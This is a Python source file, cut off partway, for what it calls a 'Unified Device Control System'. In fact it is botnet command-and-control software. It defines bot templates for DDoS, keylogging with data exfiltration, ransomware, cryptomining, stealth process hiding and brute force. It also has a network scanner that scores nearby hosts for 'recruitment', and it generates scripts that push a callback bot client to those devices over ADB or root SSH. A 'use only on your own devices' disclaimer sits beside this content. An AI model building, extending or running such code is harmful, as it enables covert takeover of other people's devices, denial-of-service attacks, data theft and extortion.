#!/usr/bin/env python3
"""
Unified Device Control System
A secure, local-first device management system with web dashboard.

SECURITY WARNING: Only use on devices you own and control.
This system includes safeguards but should be used responsibly.
"""

import asyncio
import json
import logging
import os
import sqlite3
import sys
import time
import uuid
import hashlib
import subprocess
import tempfile
import signal
import argparse
import socket
from pathlib import Path
from typing import Dict, List, Optional, Any
import threading
import psutil

def check_and_install_dependencies():
    """Check for required dependencies and auto-install if missing"""
    required_packages = {
        'websockets': 'websockets>=13.0.1',
        'aiohttp': 'aiohttp>=3.9.1',
        'aiofiles': 'aiofiles>=24.1.0',
        'psutil': 'psutil>=6.0.0',
        'requests': 'requests>=2.32.0'
    }
    
    missing_packages = []
    
    for package_name, package_spec in required_packages.items():
        try:
            __import__(package_name)
        except ImportError:
            missing_packages.append(package_spec)
    
    if missing_packages:
        print("📦 Missing dependencies detected. Auto-installing...")
        print(f"   Packages to install: {', '.join(missing_packages)}")
        
        try:
            import subprocess
            import sys
            
            # Try pip3 first, then pip
            pip_cmd = 'pip3' if subprocess.run(['which', 'pip3'], capture_output=True).returncode == 0 else 'pip'
            
            # Install missing packages
            for package in missing_packages:
                print(f"   Installing {package}...")
                result = subprocess.run(
                    [pip_cmd, 'install', '--user', package],
                    capture_output=True,
                    text=True,
                    timeout=120
                )
                
                if result.returncode != 0:
                    print(f"   ⚠️  Warning: Failed to install {package}")
                    print(f"   Error: {result.stderr}")
                else:
                    print(f"   ✅ Successfully installed {package}")
            
            print("✅ Dependency installation complete!")
            print("   Restarting application...")
            
            # Restart the script to use newly installed packages
            os.execv(sys.executable, [sys.executable] + sys.argv)
            
        except Exception as e:
            print(f"❌ Auto-installation failed: {e}")
            print("\n📋 Manual installation required:")
            print("   pip install -r requirements.txt")
            print("   OR")
            print(f"   pip install {' '.join(missing_packages)}")
            sys.exit(1)
    
    return True

# Check and auto-install dependencies before importing
check_and_install_dependencies()

try:
    import websockets
    from aiohttp import web, MultipartReader
    import aiofiles
except ImportError as e:
    print(f"❌ Dependency import failed after installation attempt: {e}")
    print("📋 Please manually install dependencies:")
    print("   pip install -r requirements.txt")
    sys.exit(1)

# Configuration - Auto-optimized for maximum performance
DEFAULT_HOST = "0.0.0.0"  # Allow external connections for mobile devices
DEFAULT_WS_PORT = 8765
DEFAULT_HTTP_PORT = 8766
DEFAULT_DB_PATH = "./unified_control.sqlite"
DEFAULT_UPLOAD_DIR = "./uploads"
MAX_UPLOAD_SIZE = 100 * 1024 * 1024  # 100MB for larger deployments and payloads
MAX_DEVICES = 50000  # Support massive botnets with 50,000+ devices
HEARTBEAT_INTERVAL = 30  # Optimized for large scale
DEVICE_TIMEOUT = 90

# Security limits for sandboxed execution - Auto-optimized
EXEC_TIMEOUT = 300  # 5 minutes for complex operations
MAX_CPU_PERCENT = 95  # Near maximum CPU usage
MAX_MEMORY_MB = 4096  # 4GB memory for intensive operations
MAX_OUTPUT_SIZE = 50 * 1024 * 1024  # 50MB output for large operations

# Load balancing and performance - Optimized for stability and low resource usage
MAX_CONCURRENT_COMMANDS = 50   # Reduced from 500 to 50 for better stability
COMMAND_QUEUE_SIZE = 1000      # Reduced from 10000 to 1000 for memory efficiency  
DEVICE_BATCH_SIZE = 50         # Reduced from 500 to 50 for lower strain

# Auto resource optimization
def auto_optimize_resources():
    """Auto-detect and optimize system resources for maximum performance without damage"""
    try:
        # Get system specs
        ram_gb = psutil.virtual_memory().total / (1024**3)
        cpu_count = psutil.cpu_count()
        
        # Auto-optimize based on available resources (use 80% to prevent damage)
        global MAX_DEVICES, MAX_CONCURRENT_COMMANDS, MAX_MEMORY_MB
        
        if ram_gb < 1:  # Mobile devices
            MAX_DEVICES = min(50, MAX_DEVICES)
            MAX_CONCURRENT_COMMANDS = min(10, MAX_CONCURRENT_COMMANDS)
            MAX_MEMORY_MB = min(256, MAX_MEMORY_MB)
        elif ram_gb < 2:  # Low-end devices
            MAX_DEVICES = min(200, MAX_DEVICES)
            MAX_CONCURRENT_COMMANDS = min(20, MAX_CONCURRENT_COMMANDS)
            MAX_MEMORY_MB = min(512, MAX_MEMORY_MB)
        elif ram_gb < 4:  # Medium devices
            MAX_DEVICES = min(500, MAX_DEVICES)
            MAX_CONCURRENT_COMMANDS = min(30, MAX_CONCURRENT_COMMANDS)
            MAX_MEMORY_MB = min(1024, MAX_MEMORY_MB)
        elif ram_gb < 8:  # High-end devices
            MAX_DEVICES = min(1000, MAX_DEVICES)
            MAX_CONCURRENT_COMMANDS = min(40, MAX_CONCURRENT_COMMANDS)
            MAX_MEMORY_MB = min(2048, MAX_MEMORY_MB)
        elif ram_gb < 16:  # Enterprise devices
            MAX_DEVICES = min(2000, MAX_DEVICES)
            MAX_CONCURRENT_COMMANDS = min(50, MAX_CONCURRENT_COMMANDS)
            MAX_MEMORY_MB = min(3072, MAX_MEMORY_MB)
        else:  # Supercomputers/Data centers
            MAX_DEVICES = 5000  # Reduced from 50000 for stability
            MAX_CONCURRENT_COMMANDS = 100  # Reduced from 500 for stability
            MAX_MEMORY_MB = min(int(ram_gb * 1024 * 0.6), 4096)  # Use 60% of RAM, max 4GB
            
        logging.info(f"Auto-optimized: {MAX_DEVICES} devices, {MAX_CONCURRENT_COMMANDS} workers, {MAX_MEMORY_MB}MB memory")
        return True
    except Exception as e:
        logging.warning(f"Auto-optimization failed, using defaults: {e}")
        return False

# Global variables
start_time = time.time()  # Server start time for uptime calculations

# Service management
AUTO_RESTART_DELAY = 3
MAX_RESTART_ATTEMPTS = 5

# Extended device grouping for botnet operations
DEFAULT_DEVICE_GROUPS = ["production", "staging", "development", "mobile", "servers", 
                        "stealth", "miners", "scanners", "proxies", "controllers", 
                        "crawlers", "iot", "social", "ddos", "keyloggers", "bruteforcers",
                        "vulnerability_scanners", "device_discoverers", "security_auditors"]

# Advanced bot templates for real operations
BOT_TEMPLATES = {
    "termux_mobile": {
        "name": "📱 Termux Mobile Bot",
        "description": "Android device with full Termux capabilities and mobile-specific tools",
        "capabilities": ["termux", "android", "mobile_network", "location", "contacts", "sms", "camera"],
        "packages": ["termux-api", "nmap", "curl", "git", "python", "openssh"],
        "icon": "📱",
        "deployment_script": """#!/bin/bash
# Termux Mobile Bot Deployment
pkg update -y && pkg upgrade -y
pkg install -y python termux-api nmap curl git openssh
pip install websockets psutil requests
termux-setup-storage
"""
    },
    "server_bot": {
        "name": "🖥️ Server Bot", 
        "description": "Linux server with administrative privileges and system tools",
        "capabilities": ["linux", "admin", "networking", "services", "monitoring"],
        "packages": ["htop", "netstat", "ss", "lsof", "systemctl"],
        "icon": "🖥️",
        "deployment_script": """#!/bin/bash
# Server Bot Deployment
apt update && apt upgrade -y
apt install -y python3 python3-pip htop net-tools lsof
pip3 install websockets psutil requests
"""
    },
    "network_scanner": {
        "name": "🔍 Network Scanner",
        "description": "Advanced network reconnaissance and vulnerability discovery",
        "capabilities": ["nmap", "port_scanning", "service_detection", "vulnerability_scan"],
        "packages": ["nmap", "masscan", "zmap", "unicornscan"],
        "icon": "🔍",
        "deployment_script": """#!/bin/bash
# Network Scanner Bot Deployment
if command -v pkg &> /dev/null; then
    pkg install -y nmap masscan python
else
    apt update && apt install -y nmap masscan python3 python3-pip
fi
pip install websockets psutil python-nmap
"""
    },
    "stealth_bot": {
        "name": "👤 Stealth Bot",
        "description": "Covert operations with advanced process hiding and evasion",
        "capabilities": ["stealth", "process_hiding", "anti_forensics", "persistence"],
        "packages": ["rootkit_tools", "process_hider"],
        "icon": "👤",
        "deployment_script": """#!/bin/bash
# Stealth Bot Deployment - Advanced Evasion
if command -v pkg &> /dev/null; then
    pkg install -y python proot
else
    apt update && apt install -y python3 python3-pip
fi
pip install websockets psutil
# Advanced stealth techniques
echo 'Hide process implementation here'
"""
    },
    "ddos_bot": {
        "name": "💥 DDoS Bot",
        "description": "Distributed denial of service with coordination capabilities",
        "capabilities": ["ddos", "flooding", "coordination", "amplification"],
        "packages": ["hping3", "slowloris", "hulk"],
        "icon": "💥",
        "deployment_script": """#!/bin/bash
# DDoS Bot Deployment
if command -v pkg &> /dev/null; then
    pkg install -y python hping3
else
    apt update && apt install -y python3 python3-pip hping3
fi
pip install websockets psutil scapy
"""
    },
    "keylogger_bot": {
        "name": "⌨️ Keylogger Bot",
        "description": "Keystroke capture, screen recording, and data exfiltration",
        "capabilities": ["keylogging", "screen_capture", "data_exfiltration", "clipboard"],
        "packages": ["pynput", "pillow", "opencv"],
        "icon": "⌨️",
        "deployment_script": """#!/bin/bash
# Keylogger Bot Deployment
if command -v pkg &> /dev/null; then
    pkg install -y python
else
    apt update && apt install -y python3 python3-pip
fi
pip install websockets psutil pynput pillow opencv-python
"""
    },
    "mining_bot": {
        "name": "⛏️ Mining Bot",
        "description": "Cryptocurrency mining with pool management and optimization",
        "capabilities": ["crypto_mining", "pool_management", "gpu_optimization"],
        "packages": ["xmrig", "cpuminer"],
        "icon": "⛏️",
        "deployment_script": """#!/bin/bash
# Mining Bot Deployment
if command -v pkg &> /dev/null; then
    pkg install -y python git
else
    apt update && apt install -y python3 python3-pip git
fi
pip install websockets psutil requests
# Mining software installation
git clone https://github.com/xmrig/xmrig.git
"""
    },
    "ransomware_bot": {
        "name": "🔒 Ransomware Bot",
        "description": "File encryption operations with ransom management",
        "capabilities": ["file_encryption", "ransom_management", "crypto_operations"],
        "packages": ["cryptography", "file_utilities"],
        "icon": "🔒",
        "deployment_script": """#!/bin/bash
# Ransomware Bot Deployment
if command -v pkg &> /dev/null; then
    pkg install -y python
else
    apt update && apt install -y python3 python3-pip
fi
pip install websockets psutil cryptography
"""
    },
    "proxy_bot": {
        "name": "🌐 Proxy Bot",
        "description": "Traffic routing, anonymization, and network obfuscation",
        "capabilities": ["proxy", "traffic_routing", "anonymization", "tor"],
        "packages": ["tor", "privoxy", "squid"],
        "icon": "🌐",
        "deployment_script": """#!/bin/bash
# Proxy Bot Deployment
if command -v pkg &> /dev/null; then
    pkg install -y python tor
else
    apt update && apt install -y python3 python3-pip tor privoxy
fi
pip install websockets psutil requests[socks]
"""
    },
    "controller_bot": {
        "name": "👑 Botnet Controller",
        "description": "Command and control for managing sub-networks and coordinating operations",
        "capabilities": ["c2_server", "bot_coordination", "sub_network_management"],
        "packages": ["advanced_networking", "coordination_tools"],
        "icon": "👑",
        "deployment_script": """#!/bin/bash
# Controller Bot Deployment
if command -v pkg &> /dev/null; then
    pkg install -y python
else
    apt update && apt install -y python3 python3-pip
fi
pip install websockets psutil asyncio aiohttp
"""
    },
    "web_crawler": {
        "name": "🕷️ Web Crawler",
        "description": "Automated web scraping and data collection operations",
        "capabilities": ["web_scraping", "data_collection", "automation"],
        "packages": ["scrapy", "selenium", "beautifulsoup"],
        "icon": "🕷️",
        "deployment_script": """#!/bin/bash
# Web Crawler Bot Deployment
if command -v pkg &> /dev/null; then
    pkg install -y python
else
    apt update && apt install -y python3 python3-pip
fi
pip install websockets psutil scrapy selenium beautifulsoup4 requests
"""
    },
    "social_media_bot": {
        "name": "📢 Social Media Bot",
        "description": "Social media automation and influence operations",
        "capabilities": ["social_automation", "influence_operations", "content_generation"],
        "packages": ["social_apis", "automation_tools"],
        "icon": "📢",
        "deployment_script": """#!/bin/bash
# Social Media Bot Deployment
if command -v pkg &> /dev/null; then
    pkg install -y python
else
    apt update && apt install -y python3 python3-pip
fi
pip install websockets psutil tweepy instapy facebook-sdk
"""
    },
    "iot_bot": {
        "name": "🌐 IoT Bot",
        "description": "Internet of Things device exploitation and control",
        "capabilities": ["iot_exploitation", "device_control", "firmware_analysis"],
        "packages": ["iot_tools", "firmware_analysis"],
        "icon": "🌐",
        "deployment_script": """#!/bin/bash
# IoT Bot Deployment
if command -v pkg &> /dev/null; then
    pkg install -y python nmap
else
    apt update && apt install -y python3 python3-pip nmap
fi
pip install websockets psutil scapy pyserial
"""
    },
    "bruteforce_bot": {
        "name": "🔨 Brute Force Bot",
        "description": "Advanced brute force capabilities for passwords, SSH, FTP, web logins",
        "capabilities": ["password_cracking", "ssh_bruteforce", "web_bruteforce", "dictionary_attacks"],
        "packages": ["hydra", "john", "hashcat", "wordlists"],
        "icon": "🔨",
        "deployment_script": """#!/bin/bash
# Brute Force Bot Deployment
if command -v pkg &> /dev/null; then
    pkg install -y python hydra john
else
    apt update && apt install -y python3 python3-pip hydra john hashcat
fi
pip install websockets psutil paramiko requests
# Download wordlists
wget -O rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
"""
    },
    "vulnerability_scanner": {
        "name": "🔐 Vulnerability Scanner",
        "description": "Advanced vulnerability detection for networks, devices, and applications",
        "capabilities": ["vuln_scanning", "exploit_detection", "security_audit", "cve_analysis"],
        "packages": ["openvas", "nikto", "sqlmap", "metasploit"],
        "icon": "🔐",
        "deployment_script": """#!/bin/bash
# Vulnerability Scanner Bot Deployment
if command -v pkg &> /dev/null; then
    pkg install -y python nmap nikto
else
    apt update && apt install -y python3 python3-pip nmap nikto sqlmap
fi
pip install websockets psutil python-nmap vulners
# Install additional tools
curl -L https://github.com/sullo/nikto/archive/master.zip -o nikto.zip
"""
    },
    "device_discoverer": {
        "name": "📡 Device Discoverer",
        "description": "Advanced device discovery and recruitment for botnet expansion",
        "capabilities": ["device_discovery", "network_enumeration", "bot_recruitment", "target_analysis"],
        "packages": ["nmap", "masscan", "arp-scan", "discovery_tools"],
        "icon": "📡",
        "deployment_script": """#!/bin/bash
# Device Discoverer Bot Deployment
if command -v pkg &> /dev/null; then
    pkg install -y python nmap masscan
else
    apt update && apt install -y python3 python3-pip nmap masscan arp-scan
fi
pip install websockets psutil python-nmap scapy netaddr
# Setup discovery tools
echo 'Device discovery implementation'
"""
    },
    "security_auditor": {
        "name": "🛡️ Security Auditor",
        "description": "Comprehensive security auditing, compliance checking, and system analysis",
        "capabilities": ["security_audit", "compliance_check", "system_analysis", "forensics"],
        "packages": ["lynis", "chkrootkit", "rkhunter", "audit_tools"],
        "icon": "🛡️",
        "deployment_script": """#!/bin/bash
# Security Auditor Bot Deployment
if command -v pkg &> /dev/null; then
    pkg install -y python
else
    apt update && apt install -y python3 python3-pip lynis chkrootkit rkhunter
fi
pip install websockets psutil subprocess32
# Install additional security tools
curl -L https://cisofy.com/files/lynis-3.0.8.tar.gz | tar -xz
"""
    },
    "custom_bot": {
        "name": "🛠️ Custom Bot",
        "description": "Fully customizable bot with user-defined capabilities and scripts",
        "capabilities": ["custom", "user_defined", "flexible", "configurable"],
        "packages": ["base_tools"],
        "icon": "🛠️",
        "deployment_script": """#!/bin/bash
# Custom Bot Deployment Template
if command -v pkg &> /dev/null; then
    pkg install -y python
else
    apt update && apt install -y python3 python3-pip
fi
pip install websockets psutil requests
# Custom configuration will be added here
"""
    }
}

# Global state
clients: Dict[str, Dict] = {}
clients_lock = asyncio.Lock()
command_queue = asyncio.Queue(maxsize=COMMAND_QUEUE_SIZE)
device_groups: Dict[str, List[str]] = {}
active_services: Dict[str, Dict] = {}  # Track running services per device
db = None
AUTH_TOKEN = None
HOST = DEFAULT_HOST
WS_PORT = DEFAULT_WS_PORT
HTTP_PORT = DEFAULT_HTTP_PORT
UPLOAD_DIR = DEFAULT_UPLOAD_DIR

# Load balancer state
load_balancer = None

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('unified_control.log'),
        logging.StreamHandler()
    ]
)

class Database:
    """SQLite database handler for device and upload management"""
    
    def __init__(self, db_path: str):
        self.db_path = db_path
        self.init_db()
    
    def init_db(self):
        """Initialize database tables"""
        conn = sqlite3.connect(self.db_path)
        try:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS devices (
                    id TEXT PRIMARY KEY,
                    tags TEXT,
                    exec_allowed BOOLEAN DEFAULT 0,
                    last_seen INTEGER,
                    metadata TEXT,
                    created_at INTEGER DEFAULT (strftime('%s', 'now'))
                )
            """)
            
            conn.execute("""
                CREATE TABLE IF NOT EXISTS uploads (
                    id TEXT PRIMARY KEY,
                    filename TEXT NOT NULL,
                    path TEXT NOT NULL,
                    size INTEGER,
                    uploader TEXT,
                    created_at INTEGER DEFAULT (strftime('%s', 'now')),
                    sha256 TEXT
                )
            """)
            
            conn.execute("""
                CREATE TABLE IF NOT EXISTS audit_log (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp INTEGER DEFAULT (strftime('%s', 'now')),
                    device_id TEXT,
                    action TEXT,
                    command TEXT,
                    result TEXT,
                    user_agent TEXT
                )
            """)
            
            conn.commit()
        finally:
            conn.close()
    
    def add_device(self, device_id: str, tags: List[str] = None, exec_allowed: bool = False, metadata: Dict = None):
        """Add or update device information"""
        conn = sqlite3.connect(self.db_path)
        try:
            tags_str = json.dumps(tags or [])
            metadata_str = json.dumps(metadata or {})
            conn.execute("""
                INSERT OR REPLACE INTO devices (id, tags, exec_allowed, last_seen, metadata)
                VALUES (?, ?, ?, ?, ?)
            """, (device_id, tags_str, exec_allowed, int(time.time()), metadata_str))
            conn.commit()
        finally:
            conn.close()
    
    def update_device_last_seen(self, device_id: str):
        """Update device last seen timestamp"""
        conn = sqlite3.connect(self.db_path)
        try:
            conn.execute("UPDATE devices SET last_seen = ? WHERE id = ?", 
                        (int(time.time()), device_id))
            conn.commit()
        finally:
            conn.close()
    
    def add_upload(self, upload_id: str, filename: str, path: str, size: int, uploader: str):
        """Add upload record"""
        # Calculate SHA256 hash
        sha256_hash = hashlib.sha256()
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                sha256_hash.update(chunk)
        
        conn = sqlite3.connect(self.db_path)
        try:
            conn.execute("""
                INSERT INTO uploads (id, filename, path, size, uploader, sha256)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (upload_id, filename, path, size, uploader, sha256_hash.hexdigest()))
            conn.commit()
        finally:
            conn.close()
    
    def get_upload(self, upload_id: str) -> Optional[Dict]:
        """Get upload information"""
        conn = sqlite3.connect(self.db_path)
        try:
            cursor = conn.execute("SELECT * FROM uploads WHERE id = ?", (upload_id,))
            row = cursor.fetchone()
            if row:
                return {
                    "id": row[0],
                    "filename": row[1],
                    "path": row[2],
                    "size": row[3],
                    "uploader": row[4],
                    "created_at": row[5],
                    "sha256": row[6]
                }
        finally:
            conn.close()
        return None
    
    def list_uploads(self) -> List[Dict]:
        """List all uploads"""
        conn = sqlite3.connect(self.db_path)
        try:
            cursor = conn.execute("SELECT * FROM uploads ORDER BY created_at DESC")
            uploads = []
            for row in cursor.fetchall():
                uploads.append({
                    "id": row[0],
                    "filename": row[1],
                    "path": row[2],
                    "size": row[3],
                    "uploader": row[4],
                    "created_at": row[5],
                    "sha256": row[6]
                })
            return uploads
        finally:
            conn.close()
    
    def log_audit(self, device_id: str, action: str, command: str, result: str, user_agent: str = None):
        """Add audit log entry"""
        conn = sqlite3.connect(self.db_path)
        try:
            conn.execute("""
                INSERT INTO audit_log (device_id, action, command, result, user_agent)
                VALUES (?, ?, ?, ?, ?)
            """, (device_id, action, command, result, user_agent))
            conn.commit()
        finally:
            conn.close()

class LoadBalancer:
    """Advanced load balancer for distributing commands across devices"""
    
    def __init__(self):
        self.command_queue = asyncio.Queue(maxsize=COMMAND_QUEUE_SIZE)
        self.device_loads: Dict[str, int] = {}
        self.running = False
        self.workers = []
    
    async def start(self):
        """Start load balancer workers"""
        self.running = True
        for i in range(MAX_CONCURRENT_COMMANDS):
            worker = asyncio.create_task(self._worker(f"worker-{i}"))
            self.workers.append(worker)
        logging.info(f"Load balancer started with {MAX_CONCURRENT_COMMANDS} workers")
    
    async def stop(self):
        """Stop load balancer"""
        self.running = False
        for worker in self.workers:
            worker.cancel()
        await asyncio.gather(*self.workers, return_exceptions=True)
    
    async def _worker(self, worker_id: str):
        """Worker coroutine to process commands"""
        while self.running:
            try:
                command_data = await asyncio.wait_for(
                    self.command_queue.get(), timeout=1.0
                )
                await self._execute_command(command_data, worker_id)
                self.command_queue.task_done()
            except asyncio.TimeoutError:
                continue
            except Exception as e:
                logging.error(f"Worker {worker_id} error: {e}")
    
    async def _execute_command(self, command_data: Dict, worker_id: str):
        """Execute command on target devices"""
        target = command_data["target"]
        command = command_data["command"]
        client_id = command_data.get("client_id")
        
        try:
            # Get least loaded devices
            target_devices = await self._get_optimal_devices(target)
            
            results = {}
            for device_id in target_devices:
                if device_id in clients:
                    client = clients[device_id]
                    try:
                        await client["websocket"].send(json.dumps({
                            "type": "command",
                            "command": command,
                            "worker_id": worker_id,
                            "timestamp": time.time()
                        }))
                        results[device_id] = {"status": "sent", "worker": worker_id}
                        self.device_loads[device_id] = self.device_loads.get(device_id, 0) + 1
                    except Exception as e:
                        results[device_id] = {"error": str(e)}
            
            # Log execution
            db.log_audit("load_balancer", "bulk_command", command, 
                        json.dumps(results), worker_id)
            
        except Exception as e:
            logging.error(f"Command execution error in {worker_id}: {e}")
    
    async def _get_optimal_devices(self, target_spec: str) -> List[str]:
        """Get optimal devices based on load"""
        target_parsed = parse_target_spec(target_spec)
        matching_devices = await get_matching_clients(target_parsed)
        
        # Sort by load (ascending)
        return sorted(matching_devices, 
                     key=lambda d: self.device_loads.get(d, 0))
    
    async def queue_command(self, target: str, command: str, client_id: str = None):
        """Queue command for load-balanced execution"""
        try:
            await self.command_queue.put({
                "target": target,
                "command": command,
                "client_id": client_id,
                "queued_at": time.time()
            })
            return {"status": "queued", "queue_size": self.command_queue.qsize()}
        except asyncio.QueueFull:
            return {"error": "command_queue_full"}

class DeviceManager:
    """Advanced device management with grouping and monitoring"""
    
    def __init__(self):
        self.groups: Dict[str, List[str]] = {}
        self.device_stats: Dict[str, Dict] = {}
        self.service_registry: Dict[str, Dict] = {}
    
    def add_device_to_group(self, device_id: str, group: str):
        """Add device to a group"""
        if group not in self.groups:
            self.groups[group] = []
        if device_id not in self.groups[group]:
            self.groups[group].append(device_id)
    
    def remove_device_from_group(self, device_id: str, group: str):
        """Remove device from a group"""
        if group in self.groups and device_id in self.groups[group]:
            self.groups[group].remove(device_id)
    
    def get_devices_in_group(self, group: str) -> List[str]:
        """Get all devices in a group"""
        return self.groups.get(group, [])
    
    def get_device_groups(self, device_id: str) -> List[str]:
        """Get all groups a device belongs to"""
        return [group for group, devices in self.groups.items() 
                if device_id in devices]
    
    def update_device_stats(self, device_id: str, stats: Dict):
        """Update device statistics"""
        if device_id not in self.device_stats:
            self.device_stats[device_id] = {}
        self.device_stats[device_id].update(stats)
        self.device_stats[device_id]["last_update"] = time.time()
    
    def register_service(self, device_id: str, service_name: str, service_config: Dict):
        """Register a running service on a device"""
        key = f"{device_id}:{service_name}"
        self.service_registry[key] = {
            "device_id": device_id,
            "service_name": service_name,
            "config": service_config,
            "started_at": time.time(),
            "status": "running"
        }
    
    def get_device_services(self, device_id: str) -> List[Dict]:
        """Get all services running on a device"""
        return [service for key, service in self.service_registry.items()
                if service["device_id"] == device_id]
    
    def get_all_services(self) -> Dict[str, List[Dict]]:
        """Get all services grouped by device"""
        services_by_device = {}
        for service in self.service_registry.values():
            device_id = service["device_id"]
            if device_id not in services_by_device:
                services_by_device[device_id] = []
            services_by_device[device_id].append(service)
        return services_by_device
    
    def cleanup_empty_groups(self):
        """Remove empty groups to prevent memory bloat"""
        empty_groups = [group for group, devices in self.groups.items() if not devices]
        for group in empty_groups:
            del self.groups[group]
        if empty_groups:
            logging.info(f"Cleaned up {len(empty_groups)} empty device groups")

class ServiceManager:
    """Manage auto-restart and persistent services"""
    
    def __init__(self):
        self.services: Dict[str, Dict] = {}
        self.restart_attempts: Dict[str, int] = {}
    
    async def deploy_service(self, device_id: str, service_name: str, 
                           file_path: str, auto_restart: bool = True):
        """Deploy a service to a device with auto-restart"""
        service_key = f"{device_id}:{service_name}"
        
        self.services[service_key] = {
            "device_id": device_id,
            "service_name": service_name,
            "file_path": file_path,
            "auto_restart": auto_restart,
            "status": "deploying",
            "deployed_at": time.time()
        }
        
        # Deploy the service
        async with clients_lock:
            if device_id in clients:
                client = clients[device_id]
                try:
                    await client["websocket"].send(json.dumps({
                        "type": "deploy_service",
                        "service_name": service_name,
                        "file_path": file_path,
                        "auto_restart": auto_restart
                    }))
                    self.services[service_key]["status"] = "deployed"
                    return {"status": "success", "service_key": service_key}
                except Exception as e:
                    self.services[service_key]["status"] = "failed"
                    return {"status": "error", "error": str(e)}
        
        return {"status": "error", "error": "device_not_connected"}
    
    async def restart_service(self, device_id: str, service_name: str):
        """Restart a service on a device"""
        service_key = f"{device_id}:{service_name}"
        
        if service_key not in self.services:
            return {"status": "error", "error": "service_not_found"}
        
        # Check restart attempts
        if self.restart_attempts.get(service_key, 0) >= MAX_RESTART_ATTEMPTS:
            return {"status": "error", "error": "max_restart_attempts_reached"}
        
        async with clients_lock:
            if device_id in clients:
                client = clients[device_id]
                try:
                    await client["websocket"].send(json.dumps({
                        "type": "restart_service",
                        "service_name": service_name
                    }))
                    
                    self.restart_attempts[service_key] = self.restart_attempts.get(service_key, 0) + 1
                    self.services[service_key]["last_restart"] = time.time()
                    
                    return {"status": "success", "attempts": self.restart_attempts[service_key]}
                except Exception as e:
                    return {"status": "error", "error": str(e)}
        
        return {"status": "error", "error": "device_not_connected"}

# Device Discovery and Recruitment System
class DeviceDiscoverer:
    """Advanced device discovery and recruitment system"""
    
    def __init__(self):
        self.discovered_devices = {}
        self.scan_results = {}
    
    async def discover_local_network(self) -> Dict:
        """Discover devices on local network that can be recruited"""
        try:
            import subprocess
            import ipaddress
            import socket
            
            # Get local network range
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
            
            discovered = []
            
            # Network scan using ping
            for ip in network.hosts():
                try:
                    result = subprocess.run(['ping', '-c', '1', '-W', '1', str(ip)], 
                                          capture_output=True, text=True, timeout=2)
                    if result.returncode == 0:
                        # Device is reachable, gather more info
                        device_info = await self._analyze_device(str(ip))
                        if device_info:
                            discovered.append(device_info)
                except Exception:
                    continue
            
            self.scan_results[time.time()] = discovered
            return {"discovered": discovered, "total": len(discovered)}
            
        except Exception as e:
            return {"error": str(e), "discovered": [], "total": 0}
    
    async def _analyze_device(self, ip: str) -> Optional[Dict]:
        """Analyze a discovered device for recruitment potential"""
        try:
            import subprocess
            device_info = {"ip": ip, "services": [], "os": "unknown", "recruitment_score": 0}
            
            # Port scan for common services
            common_ports = [22, 23, 80, 443, 8080, 5555, 8765, 8766]
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((ip, port))
                    sock.close()
                    
                    if result == 0:
                        service_name = self._identify_service(port)
                        device_info["services"].append({"port": port, "service": service_name})
                        device_info["recruitment_score"] += 10
                        
                        # Special scoring for high-value targets
                        if port == 22:  # SSH
                            device_info["recruitment_score"] += 30
                        elif port == 5555:  # ADB
                            device_info["recruitment_score"] += 25
                            device_info["os"] = "android"
                        elif port in [8765, 8766]:  # Our services
                            device_info["recruitment_score"] += 50
                            
                except Exception:
                    continue
            
            # Only return devices with recruitment potential
            if device_info["recruitment_score"] > 0:
                return device_info
                
        except Exception:
            pass
        return None
    
    def _identify_service(self, port: int) -> str:
        """Identify service running on port"""
        service_map = {
            22: "SSH",
            23: "Telnet", 
            80: "HTTP",
            443: "HTTPS",
            5555: "ADB",
            8080: "HTTP-Alt",
            8765: "WebSocket",
            8766: "HTTP-Control"
        }
        return service_map.get(port, f"Port-{port}")
    
    async def generate_recruitment_script(self, target_ip: str, target_os: str = "linux") -> str:
        """Generate functional recruitment script for target device"""
        # Get current server info
        current_host = HOST
        current_ws_port = WS_PORT
        current_token = AUTH_TOKEN
        
        # Generate bot client code
        bot_client_code = self._generate_bot_client_code()
        
        if target_os == "android":
            script = f"""#!/bin/bash
# Android Device Recruitment Script - FUNCTIONAL
# Target: {target_ip}

echo "🤖 Starting Android device recruitment for {target_ip}..."

# Method 1: ADB Connection (if available)
if command -v adb >/dev/null 2>&1; then
    echo "📱 Attempting ADB connection..."
    adb connect {target_ip}:5555
    if adb devices | grep {target_ip}; then
        echo "✅ ADB Connected to {target_ip}"
        adb shell 'pkg install -y python'
        adb shell 'pip install websockets psutil requests'
        
        # Deploy bot client directly
        cat > /tmp/android_bot.py << 'BOT_CLIENT_EOF'
{bot_client_code}
BOT_CLIENT_EOF
        
        adb push /tmp/android_bot.py /data/local/tmp/bot.py
        adb shell 'cd /data/local/tmp && python bot.py --server ws://{current_host}:{current_ws_port} --token {current_token} --id android-{target_ip.replace(".", "-")} --tags android,recruited &'
        echo "🚀 Bot deployed on Android device {target_ip}"
    else
        echo "❌ ADB connection failed to {target_ip}"
    fi
else
    echo "⚠️  ADB not available. Manual deployment required."
fi

# Method 2: Manual deployment instructions
echo ""
echo "📋 Manual Deployment Instructions for {target_ip}:"
echo "1. Install Termux from F-Droid"
echo "2. Run: pkg install python"
echo "3. Run: pip install websockets psutil requests"
echo "4. Save the bot client code below and run it"
echo ""
"""
        else:
            script = f"""#!/bin/bash
# Linux Device Recruitment Script - FUNCTIONAL
# Target: {target_ip}

echo "🖥️  Starting Linux device recruitment for {target_ip}..."

# Generate bot client file
cat > /tmp/linux_bot.py << 'BOT_CLIENT_EOF'
{bot_client_code}
BOT_CLIENT_EOF

# Method 1: SSH deployment (requires access)
echo "🔐 Attempting SSH deployment..."
if command -v ssh >/dev/null 2>&1; then
    # Test SSH connection
    if ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no root@{target_ip} 'echo "SSH OK"' 2>/dev/null; then
        echo "✅ SSH connection established to {target_ip}"
        
        # Install dependencies
        ssh root@{target_ip} 'apt update && apt install -y python3 python3-pip'
        ssh root@{target_ip} 'pip3 install websockets psutil requests'
        
        # Deploy bot
